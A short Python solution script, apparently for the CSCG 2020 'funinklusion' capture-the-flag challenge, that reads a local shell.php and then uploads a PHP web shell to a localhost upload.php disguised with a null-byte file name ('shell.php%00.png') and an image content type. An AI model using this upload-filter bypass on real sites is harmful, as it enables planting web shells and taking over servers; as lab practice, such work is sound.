f=open('/data/CSCG2020/funinklusion/shell.php','r')
#l=f.read()
#l=l.strip()
#print(l)
o=''
for l in f.readlines():
    l=l.replace("\n"," ")
    o+=l
print(o)
exit()

import requests
r=requests.post('http://localhost/upload.php', files={'file': ('shell.php%00.png',open('shell2.php', 'rb').read(), 'image/png')})
print(r.text)